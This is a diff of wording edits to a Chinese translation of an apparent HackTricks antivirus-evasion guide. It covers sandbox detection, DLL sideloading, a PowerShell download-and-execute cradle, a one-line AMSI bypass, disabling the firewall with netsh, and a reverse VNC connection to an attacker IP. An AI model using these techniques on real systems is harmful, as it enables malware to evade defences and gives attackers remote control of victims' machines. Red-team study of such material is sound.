@@ -14,7 +14,7 @@
 
 - **加密**
 
-如果你加密了二进制文件，AV将无法检测到你的程序，但你需要某种加载程序来解密并在内存中运行该程序。
+如果你加密二进制文件，AV将无法检测到你的程序，但你需要某种加载程序来解密并在内存中运行该程序。
 
 - **混淆**
 
@@ -37,7 +37,7 @@
 - **检查机器资源** 通常沙箱可用的资源非常少（例如，< 2GB RAM），否则可能会减慢用户的机器。你也可以在这里发挥创造力，例如检查CPU的温度或风扇速度，并不是所有内容都会在沙箱中实现。
 - **特定机器检查** 如果你想针对加入“contoso.local”域的用户的工作站，可以检查计算机的域以查看是否与指定的域匹配，如果不匹配，可以让你的程序退出。
 
-事实证明，Microsoft Defender的沙箱计算机名是HAL9TH，因此，你可以在恶意软件引爆前检查计算机名称，如果名称匹配HAL9TH，则意味着你在Defender的沙箱中，因此可以让你的程序退出。
+事实证明，Microsoft Defender的沙箱计算机名是HAL9TH，因此，你可以在恶意软件引爆前检查计算机名，如果名称匹配HAL9TH，则意味着你在Defender的沙箱中，因此可以让你的程序退出。
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>来源: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
@@ -60,7 +60,7 @@
 
 正如我们在这张图片中看到的，Havoc的DLL有效载荷在antiscan.me上的检测率为4/26，而EXE有效载荷的检测率为7/26。
 
-<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me对正常Havoc EXE有效载荷与正常Havoc DLL的比较</p></figcaption></figure>
+<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me对普通Havoc EXE有效载荷与普通Havoc DLL的比较</p></figcaption></figure>
 
 现在我们将展示一些可以使用DLL文件的技巧，以便更加隐蔽。
 
@@ -79,7 +79,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 我强烈建议您**自己探索可被DLL劫持/侧载的程序**，如果正确执行，这种技术相当隐蔽，但如果您使用公开已知的DLL侧载程序，可能会很容易被抓住。
 
-仅仅放置一个恶意DLL，其名称是程序期望加载的，并不会加载您的有效载荷，因为程序期望该DLL中有一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为**DLL代理/转发**。
+仅仅放置一个恶意DLL，其名称是程序期望加载的名称，并不会加载您的有效载荷，因为程序期望该DLL中有一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为**DLL代理/转发**。
 
 **DLL代理**将程序从代理（和恶意）DLL发出的调用转发到原始DLL，从而保留程序的功能并能够处理您的有效载荷的执行。
 
@@ -102,12 +102,12 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率为 0/26！我会称之为成功。
+我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率为 0/26！我认为这是一个成功。
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
 > [!NOTE]
-> 我 **强烈推荐** 你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE)，以更深入地了解我们讨论的内容。
+> 我 **强烈推荐** 你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE) 以更深入地了解我们讨论的内容。
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
@@ -123,7 +123,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 > [!NOTE]
-> 规避只是猫和老鼠的游戏，今天有效的方法明天可能会被检测到，因此永远不要仅依赖一个工具，如果可能，尝试将多个规避技术结合起来。
+> 规避只是猫和老鼠的游戏，今天有效的方法明天可能会被检测到，因此永远不要仅依赖一个工具，如果可能的话，尝试将多个规避技术结合起来。
 
 ## AMSI（反恶意软件扫描接口）
 
@@ -137,13 +137,13 @@ AMSI功能集成在Windows的以下组件中。
 - JavaScript和VBScript
 - Office VBA宏
 
-它允许杀毒解决方案通过以未加密和未混淆的形式暴露脚本内容来检查脚本行为。
+它允许杀毒软件通过以未加密和未混淆的形式暴露脚本内容来检查脚本行为。
 
-运行`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`将在Windows Defender上产生以下警报。
+运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 将在Windows Defender上产生以下警报。
 
 <figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>
 
-注意它是如何在脚本运行的可执行文件路径前加上`amsi:`，在这种情况下是powershell.exe。
+注意它是如何在前面加上 `amsi:` 然后是脚本运行的可执行文件的路径，在这种情况下是powershell.exe。
 
 我们没有将任何文件写入磁盘，但仍然因为AMSI在内存中被捕获。
 
@@ -151,9 +151,9 @@ AMSI功能集成在Windows的以下组件中。
 
 - **混淆**
 
-由于AMSI主要依赖静态检测，因此修改你尝试加载的脚本可能是规避检测的好方法。
+由于AMSI主要依赖静态检测，因此，修改你尝试加载的脚本可能是规避检测的好方法。
 
-然而，AMSI有能力解混淆脚本，即使它有多层，因此混淆可能是一个糟糕的选择，这取决于它的实现方式。这使得规避变得不那么简单。尽管有时，你所需要做的只是更改几个变量名称，你就可以成功，因此这取决于某个内容被标记的程度。
+然而，AMSI有能力解混淆脚本，即使它有多层，因此混淆可能是一个糟糕的选择，这取决于它的实现方式。这使得规避变得不那么简单。尽管有时，你所需要做的只是更改几个变量名称，你就可以成功，因此这取决于某个东西被标记的程度。
 
 - **AMSI绕过**
 
@@ -161,7 +161,7 @@ AMSI功能集成在Windows的以下组件中。
 
 **强制错误**
 
-强制AMSI初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初这是由[Matt Graeber](https://twitter.com/mattifestation)披露的，微软已经开发了一种签名以防止更广泛的使用。
+强制AMSI初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初这是由[Matt Graeber](https://twitter.com/mattifestation)披露的，微软已经开发了一种签名来防止更广泛的使用。
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
@@ -190,17 +190,17 @@ $Spotfix.SetValue($null,$true)
 > [!NOTE]
 > 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获取更详细的解释。
 
-还有许多其他技术可以通过 PowerShell 绕过 AMSI，查看 [**此页面**](basic-powershell-for-pentesters/#amsi-bypass) 和 [此仓库](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多信息。
+还有许多其他技术可以通过 PowerShell 绕过 AMSI，查看 [**此页面**](basic-powershell-for-pentesters/#amsi-bypass) 和 [这个仓库](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多信息。
 
 或者这个脚本通过内存补丁将补丁应用于每个新的 PowerShell。
 
 ## 混淆
 
-有几种工具可以用来 **混淆 C# 明文代码**，生成 **元编程模板** 以编译二进制文件或 **混淆已编译的二进制文件**，例如：
+有几种工具可以用来 **混淆 C# 明文代码**，生成 **元编程模板** 以编译二进制文件或 **混淆编译后的二进制文件**，例如：
 
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 混淆器**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目的是提供一个开源的 LLVM 编译套件的分支，能够通过 [代码混淆](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改提供增强的软件安全性。
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 语言在编译时生成混淆代码，而不使用任何外部工具且不修改编译器。
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目的是提供一个开源的 LLVM 编译套件分支，能够通过 [代码混淆](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改提供增强的软件安全性。
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 语言在编译时生成混淆代码，而无需使用任何外部工具且不修改编译器。
 - [**obfy**](https://github.com/fritzone/obfy): 添加一层由 C++ 模板元编程框架生成的混淆操作，这将使想要破解应用程序的人稍微困难一些。
 - [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆各种不同的 pe 文件，包括：.exe, .dll, .sys
 - [**metame**](https://github.com/a0rtega/metame): Metame 是一个简单的变形代码引擎，用于任意可执行文件。
@@ -278,13 +278,13 @@ Adding file: /TotallyLegitApp.exe
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 > [!NOTE]
-> 如果你想了解更多关于C#程序集加载的信息，请查看这篇文章[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)及其InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）
+> 如果你想了解更多关于C#程序集加载的信息，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 和他们的InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 
-你还可以从PowerShell加载C#程序集，查看[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)和[S3cur3th1sSh1t的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。
+你还可以从PowerShell加载C#程序集，查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。
 
 ## 使用其他编程语言
 
-正如在[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)中提出的，可以通过让被攻陷的机器访问**安装在攻击者控制的SMB共享上的解释器环境**来使用其他语言执行恶意代码。
+正如在 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中提出的，可以通过让被攻陷的机器访问**安装在攻击者控制的SMB共享上的解释器环境**来使用其他语言执行恶意代码。
 
 通过允许访问SMB共享上的解释器二进制文件和环境，你可以**在被攻陷机器的内存中执行这些语言的任意代码**。
 
@@ -306,10 +306,10 @@ Adding file: /TotallyLegitApp.exe
 
 ## **旧技术**
 
-### **检查Defender认为恶意的部分**
+### **检查Defender发现的恶意部分**
 
-你可以使用[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它将**移除二进制文件的部分**，直到**找出Defender**认为恶意的部分并将其分开。\
-另一个做**同样事情的工具是**[**avred**](https://github.com/dobin/avred)，它在[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)提供开放的网络服务。
+你可以使用[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它将**删除二进制文件的部分**，直到**找出Defender**发现的恶意部分并将其分离给你。\
+另一个做**同样事情的工具是** [**avred**](https://github.com/dobin/avred)，它在[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)提供开放的网络服务。
 
 ### **Telnet服务器**
 
@@ -340,13 +340,13 @@ netsh advfirewall set allprofiles state off
 
 #### **反向连接**
 
-**攻击者**应在其 **主机** 中执行二进制文件 `vncviewer.exe -listen 5900`，以便 **准备** 捕获反向 **VNC 连接**。然后，在 **受害者** 机器中: 启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+**攻击者**应在其 **主机** 中执行二进制文件 `vncviewer.exe -listen 5900`，以便 **准备** 捕获反向 **VNC 连接**。然后，在 **受害者** 中: 启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
 **警告:** 为了保持隐蔽性，你必须避免以下几件事
 
-- 如果 `winvnc` 已经在运行，不要再次启动，否则会触发 [弹出窗口](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否在运行
+- 如果 `winvnc` 已经在运行，不要启动它，否则会触发一个 [弹出窗口](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否在运行
 - 如果没有 `UltraVNC.ini` 在同一目录中，不要启动 `winvnc`，否则会导致 [配置窗口](https://i.imgur.com/rfMQWcf.png) 打开
-- 不要运行 `winvnc -h` 获取帮助，否则会触发 [弹出窗口](https://i.imgur.com/oc18wcu.png)
+- 不要运行 `winvnc -h` 获取帮助，否则会触发一个 [弹出窗口](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
